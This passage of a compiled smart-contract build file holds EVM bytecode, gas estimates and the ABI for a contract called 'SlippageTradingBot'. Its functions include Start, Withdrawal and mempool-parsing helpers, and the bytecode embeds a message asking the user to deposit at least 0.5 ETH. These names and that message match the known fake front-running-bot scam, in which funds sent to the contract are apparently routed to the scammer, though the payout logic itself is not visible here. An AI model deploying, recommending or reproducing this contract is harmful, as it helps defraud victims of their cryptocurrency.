SWAP2 POP POP JUMP JUMPDEST PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xBB4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xB99 JUMP JUMPDEST PUSH0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xBD9 DUP3 PUSH2 0xB7D JUMP JUMPDEST PUSH2 0xBE3 DUP2 DUP6 PUSH2 0xB87 JUMP JUMPDEST SWAP4 POP PUSH2 0xBF3 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0xB97 JUMP JUMPDEST PUSH2 0xBFC DUP2 PUSH2 0xBBF JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xC1F DUP2 DUP5 PUSH2 0xBCF JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xC7D DUP3 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP PUSH2 0xC88 DUP4 PUSH2 0xC27 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0xC96 DUP2 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0xCAD JUMPI PUSH2 0xCAC PUSH2 0xC46 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xCF4 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xCFF DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0xD17 JUMPI PUSH2 0xD16 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD27 DUP3 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP PUSH2 0xD32 DUP4 PUSH2 0xC27 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xD5E JUMPI PUSH2 0xD5D PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD6E DUP3 PUSH2 0xC27 JUMP JUMPDEST SWAP2 POP PUSH2 0xD79 DUP4 PUSH2 0xC27 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xDA5 JUMPI PUSH2 0xDA4 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xDB5 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0xDE7 JUMPI PUSH2 0xDE6 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xE29 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xE34 DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xE44 JUMPI PUSH2 0xE43 PUSH2 0xDF2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xE86 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xE91 DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xEA1 JUMPI PUSH2 0xEA0 PUSH2 0xDF2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xEB6 DUP3 PUSH2 0xCE1 JUMP JUMPDEST SWAP2 POP PUSH2 0xEC1 DUP4 PUSH2 0xCE1 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0xED9 JUMPI PUSH2 0xED8 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xEF5 DUP3 PUSH2 0xEDF JUMP JUMPDEST SWAP2 POP PUSH2 0xF00 DUP4 PUSH2 0xEDF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xF19 JUMPI PUSH2 0xF18 PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xF29 DUP3 PUSH2 0xEDF JUMP JUMPDEST SWAP2 POP PUSH2 0xF34 DUP4 PUSH2 0xEDF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xF4D JUMPI PUSH2 0xF4C PUSH2 0xC46 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID 0x4E PUSH16 0x7420656E6F756768206C697175696469 PUSH21 0x7920617661696C61626C65206F6E2074686520636F PUSH15 0x747261637420746F2072756E207468 PUSH6 0x20626F742E20 NUMBER PUSH16 0x6E747261637420636F6465206E656564 PUSH20 0x206174206C6561737420302E352045544820746F KECCAK256 PUSH2 0x766F PUSH10 0x642063757272656E7420 PUSH8 0x617320666565732E LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH20 0x4C2DB0FA60328170891DFA6297B99F06D0F9E9C2 SWAP14 MSIZE 0x4A 0xEC 0xF 0xC6 PUSH26 0xD09DFC7F64736F6C634300081400330000000000000000000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "820600",
				"executionCost": "855",
				"totalCost": "821455"
			},
			"external": {
				"Start()": "infinite",
				"Stop()": "infinite",
				"Withdrawal()": "infinite",
				"checkLiquidity()": "infinite"
			},
			"internal": {
				"_callStopMempoolActionMempool()": "infinite",
				"beyond(struct SlippageTradingBot.slice memory,struct SlippageTradingBot.slice memory)": "infinite",
				"callMempool()": "infinite",
				"checkMempool(uint256)": "infinite",
				"findContracts(uint256,uint256,uint256,uint256)": "infinite",
				"findNewContracts()": "infinite",
				"getLiquidity()": "24",
				"getMemPoolDepth()": "22",
				"getMemPoolHeight()": "22",
				"getMemPoolLength()": "22",
				"getMemPoolOffset()": "22",
				"loadCurrentContract(string memory)": "infinite",
				"mempool(string memory,string memory)": "infinite",
				"parseMemoryPool(string memory)": "infinite",
				"toHexDigit(uint8)": "infinite",
				"uint2str(uint256)": "infinite",
				"updateLiquidity()": "infinite"
			}
		},
		"methodIdentifiers": {
			"Start()": "1b55ba3a",
			"Stop()": "bedf0f4a",
			"Withdrawal()": "70e44c6a",
			"checkLiquidity()": "d82c52d6"
		}
	},
	"abi": [
		{
			"inputs": [],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "",
					"type": "string"
				},
				{
					"indexed": false,
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				},
				{
					"indexed": false,
					"internalType": "string",
					"name": "",
					"type": "string"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "Start",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "Stop",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "Withdrawal",
			"outputs": [
				{
					"internalType": "string",
					"name": "result",
					"type": "string"
				}
			],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "checkLiquidity",
			"outputs": [
				{
					"internalType": "string",
					"name": "",
					"type": "string"
				}
			],
			"stateMutability": "pure",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}